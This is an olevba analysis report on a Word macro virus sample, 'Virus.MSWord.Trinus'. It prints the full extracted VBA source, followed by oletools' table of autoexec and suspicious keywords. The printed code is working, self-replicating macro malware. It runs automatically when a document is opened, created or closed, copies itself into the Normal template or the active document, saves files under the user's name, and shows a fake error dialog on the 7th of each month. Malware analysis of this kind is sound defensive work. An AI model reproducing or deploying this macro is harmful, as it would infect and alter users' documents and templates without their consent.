olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Trinus
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Trinus - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Trinus
Private Sub Document_Open(): Dim a, b, c: On Error Resume Next
jedan = jedan + 1: Set b = MacroContainer
If ThisDocument = ActiveDocument Then Set host = NormalTemplate Else Set host = ActiveDocument
If b.VBProject.vbcomponents(jedan).codemodule.lines(jedan, jedan) = "'Trinus" Then
        With b.VBProject.vbcomponents(jedan).codemodule
        c = .lines(1, .countoflines)
        End With
End If
If host.VBProject.vbcomponents(jedan).codemodule.lines(jedan, jedan) <> "'Trinus" Then
    If host.VBProject.vbcomponents(jedan).codemodule.countoflines <> 26 Then
        host.VBProject.vbcomponents(jedan).codemodule.deletelines 1, jedan
        host.VBProject.vbcomponents(jedan).codemodule.addfromstring c
    End If
End If
ActiveDocument.SaveAs "C:\My Documents" & "\" & Application.UserName
If Day(Now()) = 7 Then
MsgBox "Word Internal System Error! CRC32:34#", vbCritical, "MS WORD!"
End If 'WM.Trinus by e[ax]::greetz to all ppl on #vxtrader and #vxers
End Sub
Private Sub Document_New()
Document_Open
End Sub
Private Sub Document_Close()
Document_Open
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|vbcomponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|addfromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+

